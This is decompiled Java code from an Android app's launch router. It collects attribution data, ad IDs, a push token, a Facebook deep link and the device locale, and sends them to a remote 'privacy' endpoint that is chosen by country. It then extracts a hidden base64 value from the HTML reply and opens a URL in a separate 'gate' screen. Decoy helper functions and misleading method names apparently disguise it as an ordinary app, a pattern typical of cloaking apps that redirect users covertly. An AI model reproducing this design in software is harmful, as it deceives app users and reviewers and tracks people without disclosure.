package com.zennvvarroo.pealkkk.data.services;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import androidx.compose.runtime.ComposerKt;
import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.facebook.gamingservices.cloudgaming.internal.SDKConstants;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessaging;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import kotlin.Metadata;
import kotlin.Result;
import kotlin.ResultKt;
import kotlin.TuplesKt;
import kotlin.Unit;
import kotlin.collections.ArraysKt;
import kotlin.collections.CollectionsKt;
import kotlin.collections.MapsKt;
import kotlin.jvm.functions.Function1;
import kotlin.jvm.internal.Intrinsics;
import kotlin.random.Random;
import kotlin.text.MatchResult;
import kotlin.text.Regex;
import kotlin.text.StringsKt;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import org.json.JSONObject;

/* compiled from: ZenvaroPeakC533LaunchRouter.kt */
@Metadata(d1 = {"\u0000\u008e\u0001\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0010\t\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000b\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\n\n\u0002\u0010$\n\u0002\b\u0004\n\u0002\u0010\u0002\n\u0002\b\u0002\n\u0002\u0010\u0006\n\u0002\b\u0002\n\u0002\u0010 \n\u0002\b\b\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\b\n\u0002\b\u0006\n\u0002\u0018\u0002\n\u0002\b\u0007\n\u0002\u0010\u0012\n\u0002\b\u0010\bÇ\u0002\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002J\u0018\u0010\u001f\u001a\u00020\u00162\u0006\u0010 \u001a\u00020\u00162\u0006\u0010!\u001a\u00020\u0004H\u0002J\u001c\u0010\"\u001a\u00020\u00162\u0012\u0010#\u001a\u000e\u0012\u0004\u0012\u00020\u0004\u0012\u0004\u0012\u00020\u00010$H\u0002J\u0012\u0010%\u001a\u000e\u0012\u0004\u0012\u00020\u0004\u0012\u0004\u0012\u00020\u00010$J\u000e\u0010&\u001a\u00020\f2\u0006\u0010'\u001a\u00020\u0004J\b\u0010(\u001a\u00020)H\u0002J\u000e\u0010*\u001a\u00020)2\u0006\u0010+\u001a\u00020,J\u0014\u0010-\u001a\u00020\u00042\f\u0010.\u001a\b\u0012\u0004\u0012\u00020,0/J\u0012\u00100\u001a\u0004\u0018\u00010\u00042\u0006\u00101\u001a\u00020\u0004H\u0002J\u0010\u00102\u001a\u00020)2\u0006\u00103\u001a\u00020\nH\u0002J\b\u00104\u001a\u00020\u0004H\u0002J\b\u00105\u001a\u00020\u0004H\u0002J(\u00106\u001a\u00020)2\u0006\u00103\u001a\u00020\n2\u0018\u00107\u001a\u0014\u0012\n\u0012\b\u0012\u0004\u0012\u00020\u000409\u0012\u0004\u0012\u00020)08J\u0006\u0010:\u001a\u00020\fJ\u000e\u0010;\u001a\u00020<2\u0006\u0010=\u001a\u00020<J\u0010\u0010>\u001a\u00020)2\u0006\u0010?\u001a\u00020\u0004H\u0002J\u001c\u0010@\u001a\u00020)2\u0012\u0010#\u001a\u000e\u0012\u0004\u0012\u00020\u0004\u0012\u0004\u0012\u00020\u00010$H\u0002J\u0016\u0010A\u001a\u00020)2\u0006\u0010B\u001a\u00020C2\u0006\u0010D\u001a\u00020\u0004J\u0006\u0010E\u001a\u00020)J\u0006\u0010F\u001a\u00020)J(\u0010G\u001a\u00020)2\u0006\u0010H\u001a\u00020\u00042\u0018\u00107\u001a\u0014\u0012\n\u0012\b\u0012\u0004\u0012\u00020\u000409\u0012\u0004\u0012\u00020)08J\u000e\u0010I\u001a\u00020)2\u0006\u0010J\u001a\u00020KJ\b\u0010L\u001a\u00020)H\u0002J\b\u0010M\u001a\u00020\u0004H\u0002J\u000e\u0010N\u001a\u00020\u00042\u0006\u0010'\u001a\u00020\u0004J\u0010\u0010O\u001a\u00020\u00042\u0006\u0010P\u001a\u00020\u0004H\u0002J\u0018\u0010Q\u001a\u00020)2\u0006\u0010R\u001a\u00020\u00042\u0006\u0010S\u001a\u00020\u0004H\u0002J\u0010\u0010T\u001a\u00020)2\u0006\u0010R\u001a\u00020\u0004H\u0002J\u000e\u0010U\u001a\u00020)2\u0006\u0010V\u001a\u00020\u0004J\u0018\u0010W\u001a\u00020)2\u0006\u00103\u001a\u00020\n2\u0006\u0010X\u001a\u00020\u0004H\u0002J\u000e\u0010Y\u001a\u00020)2\u0006\u00103\u001a\u00020\nJ\b\u0010Z\u001a\u00020)H\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0004X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0004X\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\bX\u0082T¢\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\nX\u0082.¢\u0006\u0002\n\u0000R\u000e\u0010\u000b\u001a\u00020\fX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\r\u001a\u00020\u000eX\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u000f\u001a\u00020\u0010X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0011\u001a\u00020\fX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0012\u001a\u00020\fX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0013\u001a\u00020\u0014X\u0082\u0004¢\u0006\u0002\n\u0000R\u0010\u0010\u0015\u001a\u0004\u0018\u00010\u0016X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0017\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u0018\u001a\u00020\u0019X\u0082.¢\u0006\u0002\n\u0000R\u000e\u0010\u001a\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u001b\u001a\u00020\fX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u001c\u001a\u00020\fX\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u001d\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u000e\u0010\u001e\u001a\u00020\u0004X\u0082\u000e¢\u0006\u0002\n\u0000¨\u0006["}, d2 = {"Lcom/zennvvarroo/pealkkk/data/services/ZenvaroPeakC533LaunchRouter;", "", "()V", "ATTRIBUTION_KEY", "", "PRIMARY_ENDPOINT", "REGIONAL_ENDPOINT", "SOCIAL_APP_VALUE", "", "appContext", "Landroid/content/Context;", "appsFlyerReady", "", "attributionTimeoutRunnable", "Ljava/lang/Runnable;", "client", "Lokhttp3/OkHttpClient;", "facebookReady", "firebaseReady", "mainHandler", "Landroid/os/Handler;", "pendingAFData", "Lorg/json/JSONObject;", "pendingFacebookDeepLink", "prefs", "Lcom/zennvvarroo/pealkkk/data/services/ZenvaroPeakC533LocalVault;", "routingParams", "serverRequestAlreadyStarted", "sessionStarted", "targetEndpoint", "tokenHex", "buildFinalRequestJson", "afData", SDKConstants.PARAM_DEEP_LINK, "buildFullRawAFData", "conversionInfo", "", "buildRandomConfig", "checkCasePalindrome", "text", "clearRoutingState", "", "delayUIUpdate", "secs", "", "doubleToLine", "arr", "", "extractBase64", "html", "fetchFacebookDeferredDeepLink", "context", "getDeviceCountry", "getDeviceLanguage", "initApp", "completion", "Lkotlin/Function1;", "Lkotlin/Result;", "isSessionInit", "localMathCompute", "", "x", "onConversionDataFail", "error", "onConversionDataSuccess", "openGate", "activity", "Landroid/app/Activity;", "url", "parseAFSnippet", "parseNetSnippet", "privacyAndTermsReq", "code", "registerToken", "deviceToken", "", "requestPushToken", "resolveEndpointByLocale", "reverseSwiftText", "sanitizeFacebookDeepLink", "raw", "sendNotice", "name", "message", "sendNoticeError", "setFirebaseTokenLater", "token", "setupAppsFlyer", "devKey", "startAttributionBridge", "tryStartServerRequest", "app_release"}, k = 1, mv = {1, 9, 0}, xi = 48)
/* loaded from: classes3.dex */
public final class ZenvaroPeakC533LaunchRouter {
    private static final String ATTRIBUTION_KEY = "WB3x6q6LTLZE5fkjCqM2p";
    private static final String PRIMARY_ENDPOINT = "https://woropttee.lol/privacy";
    private static final String REGIONAL_ENDPOINT = "https://ru.woropttee.lol/privacy";
    private static final long SOCIAL_APP_VALUE = 1111111111111111L;
    private static Context appContext;
    private static boolean appsFlyerReady;
    private static boolean facebookReady;
    private static boolean firebaseReady;
    private static JSONObject pendingAFData;
    private static ZenvaroPeakC533LocalVault prefs;
    private static boolean serverRequestAlreadyStarted;
    private static boolean sessionStarted;
    public static final ZenvaroPeakC533LaunchRouter INSTANCE = new ZenvaroPeakC533LaunchRouter();
    private static String targetEndpoint = "";
    private static String routingParams = "data";
    private static String tokenHex = "";
    private static final Handler mainHandler = new Handler(Looper.getMainLooper());
    private static final OkHttpClient client = new OkHttpClient.Builder().connectTimeout(20, TimeUnit.SECONDS).readTimeout(20, TimeUnit.SECONDS).writeTimeout(20, TimeUnit.SECONDS).build();
    private static String pendingFacebookDeepLink = "";
    private static final Runnable attributionTimeoutRunnable = new Runnable() { // from class: com.zennvvarroo.pealkkk.data.services.ZenvaroPeakC533LaunchRouter$$ExternalSyntheticLambda2
        @Override // java.lang.Runnable
        public final void run() {
            ZenvaroPeakC533LaunchRouter.attributionTimeoutRunnable$lambda$0();
        }
    };
    public static final int $stable = 8;

    /* JADX INFO: Access modifiers changed from: private */
    public static final void delayUIUpdate$lambda$10() {
    }

    public final int localMathCompute(int x) {
        return (x * 4) - 2;
    }

    private ZenvaroPeakC533LaunchRouter() {
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void attributionTimeoutRunnable$lambda$0() {
        if (!appsFlyerReady) {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("af_status", "Organic");
            jSONObject.put("fallback_reason", "AppsFlyer timeout");
            jSONObject.put("is_first_launch", false);
            pendingAFData = jSONObject;
            appsFlyerReady = true;
        }
        if (!facebookReady) {
            pendingFacebookDeepLink = "";
            facebookReady = true;
        }
        if (!firebaseReady) {
            if (StringsKt.isBlank(tokenHex)) {
                tokenHex = "no_firebase_token";
            }
            firebaseReady = true;
        }
        INSTANCE.tryStartServerRequest();
    }

    public final void initApp(Context context, Function1<? super Result<String>, Unit> completion) {
        Intrinsics.checkNotNullParameter(context, "context");
        Intrinsics.checkNotNullParameter(completion, "completion");
        Context applicationContext = context.getApplicationContext();
        Intrinsics.checkNotNullExpressionValue(applicationContext, "getApplicationContext(...)");
        appContext = applicationContext;
        Context context2 = appContext;
        Context context3 = null;
        if (context2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("appContext");
            context2 = null;
        }
        prefs = new ZenvaroPeakC533LocalVault(context2);
        Random.INSTANCE.nextInt(10, 100);
        targetEndpoint = resolveEndpointByLocale();
        routingParams = "data";
        clearRoutingState();
        requestPushToken();
        Context context4 = appContext;
        if (context4 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("appContext");
            context4 = null;
        }
        setupAppsFlyer(context4, ATTRIBUTION_KEY);
        Context context5 = appContext;
        if (context5 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("appContext");
        } else {
            context3 = context5;
        }
        fetchFacebookDeferredDeepLink(context3);
        mainHandler.postDelayed(attributionTimeoutRunnable, 30000L);
        Result.Companion companion = Result.INSTANCE;
        completion.invoke(Result.m6238boximpl(Result.m6239constructorimpl("Initialization completed successfully")));
    }

    private final String resolveEndpointByLocale() {
        String country = Locale.getDefault().getCountry();
        Intrinsics.checkNotNullExpressionValue(country, "getCountry(...)");
        Locale US = Locale.US;
        Intrinsics.checkNotNullExpressionValue(US, "US");
        String upperCase = country.toUpperCase(US);
        Intrinsics.checkNotNullExpressionValue(upperCase, "toUpperCase(...)");
        if (Intrinsics.areEqual(upperCase, "RU")) {
            return REGIONAL_ENDPOINT;
        }
        return PRIMARY_ENDPOINT;
    }

    private final void clearRoutingState() {
        appsFlyerReady = false;
        facebookReady = false;
        firebaseReady = false;
        serverRequestAlreadyStarted = false;
        pendingAFData = null;
        pendingFacebookDeepLink = "";
        tokenHex = "";
        mainHandler.removeCallbacks(attributionTimeoutRunnable);
    }

    private final void requestPushToken() {
        try {
            FirebaseMessaging.getInstance().getToken().addOnCompleteListener(new OnCompleteListener() { // from class: com.zennvvarroo.pealkkk.data.services.ZenvaroPeakC533LaunchRouter$$ExternalSyntheticLambda4
                @Override // com.google.android.gms.tasks.OnCompleteListener
                public final void onComplete(Task task) {
                    ZenvaroPeakC533LaunchRouter.requestPushToken$lambda$2(task);
                }
            });
        } catch (Exception unused) {
            tokenHex = "no_firebase_token";
            firebaseReady = true;
            tryStartServerRequest();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void requestPushToken$lambda$2(Task task) {
        Intrinsics.checkNotNullParameter(task, "task");
        if (!task.isSuccessful()) {
            ZenvaroPeakC533LaunchRouter zenvaroPeakC533LaunchRouter = INSTANCE;
            tokenHex = "no_firebase_token";
            firebaseReady = true;
            zenvaroPeakC533LaunchRouter.tryStartServerRequest();
            return;
        }
        String str = (String) task.getResult();
        if (str == null) {
            str = "";
        }
        ZenvaroPeakC533LaunchRouter zenvaroPeakC533LaunchRouter2 = INSTANCE;
        String str2 = str;
        tokenHex = StringsKt.isBlank(str2) ? "no_firebase_token" : str2;
        firebaseReady = true;
        zenvaroPeakC533LaunchRouter2.tryStartServerRequest();
    }

    private final void setupAppsFlyer(Context context, String devKey) {
        AppsFlyerLib.getInstance().init(devKey, new AppsFlyerConversionListener() { // from class: com.zennvvarroo.pealkkk.data.services.ZenvaroPeakC533LaunchRouter$setupAppsFlyer$conversionListener$1
            @Override // com.appsflyer.AppsFlyerConversionListener
            public void onAppOpenAttribution(Map<String, String> attributionData) {
            }

            @Override // com.appsflyer.AppsFlyerConversionListener
            public void onAttributionFailure(String errorMessage) {
            }

            @Override // com.appsflyer.AppsFlyerConversionListener
            public void onConversionDataSuccess(Map<String, Object> conversionData) {
                if (conversionData == null) {
                    conversionData = new LinkedHashMap();
                }
                ZenvaroPeakC533LaunchRouter.INSTANCE.onConversionDataSuccess(conversionData);
            }

            @Override // com.appsflyer.AppsFlyerConversionListener
            public void onConversionDataFail(String errorMessage) {
                ZenvaroPeakC533LaunchRouter zenvaroPeakC533LaunchRouter = ZenvaroPeakC533LaunchRouter.INSTANCE;
                if (errorMessage == null) {
                    errorMessage = "Unknown AppsFlyer error";
                }
                zenvaroPeakC533LaunchRouter.onConversionDataFail(errorMessage);
            }
        }, context);
        AppsFlyerLib.getInstance().setDebugLog(false);
        ZenvaroPeakC533LocalVault zenvaroPeakC533LocalVault = prefs;
        ZenvaroPeakC533LocalVault zenvaroPeakC533LocalVault2 = null;
        if (zenvaroPeakC533LocalVault == null) {
            Intrinsics.throwUninitializedPropertyAccessException("prefs");
            zenvaroPeakC533LocalVault = null;
        }
        if (zenvaroPeakC533LocalVault.getHasLaunchedBefore()) {
            return;
        }
        ZenvaroPeakC533LocalVault zenvaroPeakC533LocalVault3 = prefs;
        if (zenvaroPeakC533LocalVault3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("prefs");
        } else {
            zenvaroPeakC533LocalVault2 = zenvaroPeakC533LocalVault3;
        }
        zenvaroPeakC533LocalVault2.setHasLaunchedBefore(true);
    }

    public final void startAttributionBridge(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        if (sessionStarted) {
            return;
        }
        Random.INSTANCE.nextInt(100, ComposerKt.providerKey);
        AppsFlyerLib.getInstance().start(context);
        sessionStarted = true;
    }

    private final void fetchFacebookDeferredDeepLink(Context context) {
        try {
            FacebookSdk.setAutoInitEnabled(true);
            FacebookSdk.fullyInitialize();
            AppLinkData.fetchDeferredAppLinkData(context, new AppLinkData.CompletionHandler() { // from class: com.zennvvarroo.pealkkk.data.services.ZenvaroPeakC533LaunchRouter$$ExternalSyntheticLambda3
                @Override // com.facebook.applinks.AppLinkData.CompletionHandler
                public final void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                    ZenvaroPeakC533LaunchRouter.fetchFacebookDeferredDeepLink$lambda$3(appLinkData);
                }
            });
        } catch (Exception unused) {
            pendingFacebookDeepLink = "";
            facebookReady = true;
            tryStartServerRequest();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void fetchFacebookDeferredDeepLink$lambda$3(AppLinkData appLinkData) {
        Uri targetUri;
        String uri = (appLinkData == null || (targetUri = appLinkData.getTargetUri()) == null) ? null : targetUri.toString();
        if (uri == null) {
            uri = "";
        }
        ZenvaroPeakC533LaunchRouter zenvaroPeakC533LaunchRouter = INSTANCE;
        pendingFacebookDeepLink = zenvaroPeakC533LaunchRouter.sanitizeFacebookDeepLink(uri);
        facebookReady = true;
        zenvaroPeakC533LaunchRouter.tryStartServerRequest();
    }

    private final String sanitizeFacebookDeepLink(String raw) {
        if (StringsKt.isBlank(raw)) {
            return "";
        }
        return StringsKt.replace$default(raw, "&", "=", false, 4, (Object) null);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final void onConversionDataSuccess(Map<String, ? extends Object> conversionInfo) {
        Random.INSTANCE.nextInt(1, 101);
        try {
            pendingAFData = buildFullRawAFData(conversionInfo);
            appsFlyerReady = true;
            tryStartServerRequest();
        } catch (Exception unused) {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("af_status", "Organic");
            jSONObject.put("fallback_reason", "AppsFlyer parse error");
            jSONObject.put("is_first_launch", false);
            pendingAFData = jSONObject;
            appsFlyerReady = true;
            tryStartServerRequest();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final void onConversionDataFail(String error) {
        Random.INSTANCE.nextDouble(0.0d, 1.0d);
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("af_status", "Organic");
        jSONObject.put("fallback_reason", "AppsFlyer conversion fail: " + error);
        jSONObject.put("is_first_launch", false);
        pendingAFData = jSONObject;
        appsFlyerReady = true;
        tryStartServerRequest();
    }

    private final void tryStartServerRequest() {
        if (!serverRequestAlreadyStarted && appsFlyerReady && facebookReady && firebaseReady) {
            serverRequestAlreadyStarted = true;
            mainHandler.removeCallbacks(attributionTimeoutRunnable);
            JSONObject jSONObject = pendingAFData;
            if (jSONObject == null) {
                jSONObject = new JSONObject();
                jSONObject.put("af_status", "Organic");
                jSONObject.put("fallback_reason", "AFdata was null before server request");
                jSONObject.put("is_first_launch", false);
            }
            if (StringsKt.isBlank(tokenHex)) {
                tokenHex = "no_firebase_token";
            }
            String jSONObject2 = buildFinalRequestJson(jSONObject, pendingFacebookDeepLink).toString();
            Intrinsics.checkNotNullExpressionValue(jSONObject2, "toString(...)");
            privacyAndTermsReq(StringsKt.replace$default(jSONObject2, "#", "", false, 4, (Object) null), new Function1<Result<? extends String>, Unit>() { // from class: com.zennvvarroo.pealkkk.data.services.ZenvaroPeakC533LaunchRouter$tryStartServerRequest$1
                @Override // kotlin.jvm.functions.Function1
                public /* bridge */ /* synthetic */ Unit invoke(Result<? extends String> result) {
                    m6202invoke(result.getValue());
                    return Unit.INSTANCE;
                }

                /* renamed from: invoke, reason: collision with other method in class */
                public final void m6202invoke(Object obj) {
                    if (Result.m6246isSuccessimpl(obj)) {
                        ZenvaroPeakC533LaunchRouter.INSTANCE.sendNotice("RemMess", (String) obj);
                    }
                    if (Result.m6242exceptionOrNullimpl(obj) != null) {
                        ZenvaroPeakC533LaunchRouter.INSTANCE.sendNoticeError("RemMess");
                    }
                }
            });
        }
    }

    private final JSONObject buildFullRawAFData(Map<String, ? extends Object> conversionInfo) {
        JSONObject jSONObject = new JSONObject();
        for (Map.Entry<String, ? extends Object> entry : conversionInfo.entrySet()) {
            Object value = entry.getValue();
            if (value == null) {
                jSONObject.put(entry.getKey(), JSONObject.NULL);
            } else if (value instanceof Boolean) {
                jSONObject.put(entry.getKey(), ((Boolean) value).booleanValue());
            } else if (value instanceof Integer) {
                jSONObject.put(entry.getKey(), ((Number) value).intValue());
            } else if (value instanceof Long) {
                jSONObject.put(entry.getKey(), ((Number) value).longValue());
            } else if (value instanceof Double) {
                jSONObject.put(entry.getKey(), ((Number) value).doubleValue());
            } else if (value instanceof Float) {
                jSONObject.put(entry.getKey(), ((Number) value).floatValue());
            } else if (value instanceof Number) {
                jSONObject.put(entry.getKey(), value);
            } else {
                jSONObject.put(entry.getKey(), value.toString());
            }
        }
        return jSONObject;
    }

    private final String getDeviceLanguage() {
        String language = Locale.getDefault().getLanguage();
        Intrinsics.checkNotNull(language);
        if (StringsKt.isBlank(language)) {
            return "en";
        }
        Locale US = Locale.US;
        Intrinsics.checkNotNullExpressionValue(US, "US");
        String lowerCase = language.toLowerCase(US);
        Intrinsics.checkNotNullExpressionValue(lowerCase, "toLowerCase(...)");
        return lowerCase;
    }

    private final String getDeviceCountry() {
        String country = Locale.getDefault().getCountry();
        Intrinsics.checkNotNull(country);
        if (StringsKt.isBlank(country)) {
            return "US";
        }
        Locale US = Locale.US;
        Intrinsics.checkNotNullExpressionValue(US, "US");
        String upperCase = country.toUpperCase(US);
        Intrinsics.checkNotNullExpressionValue(upperCase, "toUpperCase(...)");
        return upperCase;
    }

    private final JSONObject buildFinalRequestJson(JSONObject afData, String deepLink) {
        AppsFlyerLib appsFlyerLib = AppsFlyerLib.getInstance();
        Context context = appContext;
        if (context == null) {
            Intrinsics.throwUninitializedPropertyAccessException("appContext");
            context = null;
        }
        String appsFlyerUID = appsFlyerLib.getAppsFlyerUID(context);
        if (appsFlyerUID == null) {
            appsFlyerUID = "";
        }
        String deviceLanguage = getDeviceLanguage();
        String deviceCountry = getDeviceCountry();
        String str = tokenHex;
        if (StringsKt.isBlank(str)) {
            str = "no_firebase_token";
        }
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("AFdata", afData);
        jSONObject.put("AF_user_id", appsFlyerUID);
        jSONObject.put("language", deviceLanguage);
        jSONObject.put("deviceToken", str);
        jSONObject.put(SDKConstants.PARAM_DEEP_LINK, deepLink);
        jSONObject.put("app_id", SOCIAL_APP_VALUE);
        jSONObject.put("country", deviceCountry);
        return jSONObject;
    }

    public final void privacyAndTermsReq(String code, Function1<? super Result<String>, Unit> completion) {
        Intrinsics.checkNotNullParameter(code, "code");
        Intrinsics.checkNotNullParameter(completion, "completion");
        HttpUrl parse = HttpUrl.INSTANCE.parse(targetEndpoint);
        if (parse == null) {
            Result.Companion companion = Result.INSTANCE;
            completion.invoke(Result.m6238boximpl(Result.m6239constructorimpl(ResultKt.createFailure(new IllegalArgumentException("Invalid server url")))));
        } else {
            client.newCall(new Request.Builder().url(parse.newBuilder().addQueryParameter(routingParams, code).build()).get().build()).enqueue(new ZenvaroPeakC533LaunchRouter$privacyAndTermsReq$1(completion));
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final String extractBase64(String html) {
        List<String> groupValues;
        try {
            MatchResult find$default = Regex.find$default(new Regex("<p\\s+style=\"display:none;\">([^<]+)</p>"), html, 0, 2, null);
            if (find$default == null || (groupValues = find$default.getGroupValues()) == null) {
                return null;
            }
            return (String) CollectionsKt.getOrNull(groupValues, 1);
        } catch (Exception unused) {
            return null;
        }
    }

    public final void registerToken(byte[] deviceToken) {
        Intrinsics.checkNotNullParameter(deviceToken, "deviceToken");
        String joinToString$default = ArraysKt.joinToString$default(deviceToken, (CharSequence) "", (CharSequence) null, (CharSequence) null, 0, (CharSequence) null, (Function1) new Function1<Byte, CharSequence>() { // from class: com.zennvvarroo.pealkkk.data.services.ZenvaroPeakC533LaunchRouter$registerToken$1
            @Override // kotlin.jvm.functions.Function1
            public /* bridge */ /* synthetic */ CharSequence invoke(Byte b) {
                return invoke(b.byteValue());
            }

            public final CharSequence invoke(byte b) {
                String format = String.format("%02x", Arrays.copyOf(new Object[]{Byte.valueOf(b)}, 1));
                Intrinsics.checkNotNullExpressionValue(format, "format(...)");
                return format;
            }
        }, 30, (Object) null);
        tokenHex = joinToString$default;
        firebaseReady = true;
        joinToString$default.length();
        tryStartServerRequest();
    }

    public final void setFirebaseTokenLater(String token) {
        Intrinsics.checkNotNullParameter(token, "token");
        String str = token;
        if (StringsKt.isBlank(str)) {
            str = "no_firebase_token";
        }
        tokenHex = str;
        firebaseReady = true;
        tryStartServerRequest();
    }

    public final void openGate(Activity activity, String url) {
        Intrinsics.checkNotNullParameter(activity, "activity");
        Intrinsics.checkNotNullParameter(url, "url");
        Intent intent = new Intent(activity, (Class<?>) ZenvaroPeakC533GateActivity.class);
        intent.putExtra(ZenvaroPeakC533GateActivity.EXTRA_URL, url);
        activity.startActivity(intent);
        Random.INSTANCE.nextInt(1, 51);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final void sendNotice(final String name, final String message) {
        mainHandler.post(new Runnable() { // from class: com.zennvvarroo.pealkkk.data.services.ZenvaroPeakC533LaunchRouter$$ExternalSyntheticLambda1
            @Override // java.lang.Runnable
            public final void run() {
                ZenvaroPeakC533LaunchRouter.sendNotice$lambda$8(name, message);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void sendNotice$lambda$8(String name, String message) {
        Intrinsics.checkNotNullParameter(name, "$name");
        Intrinsics.checkNotNullParameter(message, "$message");
        if (appContext != null) {
            Intent intent = new Intent(name);
            Context context = appContext;
            Context context2 = null;
            if (context == null) {
                Intrinsics.throwUninitializedPropertyAccessException("appContext");
                context = null;
            }
            intent.setPackage(context.getPackageName());
            intent.putExtra("notificationMessage", message);
            Context context3 = appContext;
            if (context3 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("appContext");
            } else {
                context2 = context3;
            }
            context2.sendBroadcast(intent);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public final void sendNoticeError(final String name) {
        mainHandler.post(new Runnable() { // from class: com.zennvvarroo.pealkkk.data.services.ZenvaroPeakC533LaunchRouter$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                ZenvaroPeakC533LaunchRouter.sendNoticeError$lambda$9(name);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void sendNoticeError$lambda$9(String name) {
        Intrinsics.checkNotNullParameter(name, "$name");
        if (appContext != null) {
            Intent intent = new Intent(name);
            Context context = appContext;
            Context context2 = null;
            if (context == null) {
                Intrinsics.throwUninitializedPropertyAccessException("appContext");
                context = null;
            }
            intent.setPackage(context.getPackageName());
            intent.putExtra("notificationMessage", "Error occurred");
            Context context3 = appContext;
            if (context3 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("appContext");
            } else {
                context2 = context3;
            }
            context2.sendBroadcast(intent);
        }
    }

    public final boolean isSessionInit() {
        return sessionStarted;
    }

    public final String doubleToLine(List<Double> arr) {
        Intrinsics.checkNotNullParameter(arr, "arr");
        return CollectionsKt.joinToString$default(arr, ",", null, null, 0, null, null, 62, null);
    }

    public final String reverseSwiftText(String text) {
        Intrinsics.checkNotNullParameter(text, "text");
        return StringsKt.reversed((CharSequence) text).toString();
    }

    public final boolean checkCasePalindrome(String text) {
        Intrinsics.checkNotNullParameter(text, "text");
        String lowerCase = text.toLowerCase(Locale.ROOT);
        Intrinsics.checkNotNullExpressionValue(lowerCase, "toLowerCase(...)");
        return Intrinsics.areEqual(lowerCase, StringsKt.reversed((CharSequence) lowerCase).toString());
    }

    public final Map<String, Object> buildRandomConfig() {
        return MapsKt.mapOf(TuplesKt.to("mode", "testSands"), TuplesKt.to("active", Boolean.valueOf(Random.INSTANCE.nextBoolean())), TuplesKt.to("index", Integer.valueOf(Random.INSTANCE.nextInt(1, ComposerKt.providerKey))));
    }

    public final void parseAFSnippet() {
        try {
            new JSONObject("{\"sxAF\":777}");
        } catch (Exception unused) {
        }
    }

    public final void parseNetSnippet() {
        try {
            new JSONObject("{\"sxNet\":555}");
        } catch (Exception unused) {
        }
    }

    public final void delayUIUpdate(double secs) {
        mainHandler.postDelayed(new Runnable() { // from class: com.zennvvarroo.pealkkk.data.services.ZenvaroPeakC533LaunchRouter$$ExternalSyntheticLambda5
            @Override // java.lang.Runnable
            public final void run() {
                ZenvaroPeakC533LaunchRouter.delayUIUpdate$lambda$10();
            }
        }, (long) (secs * 1000));
    }
}
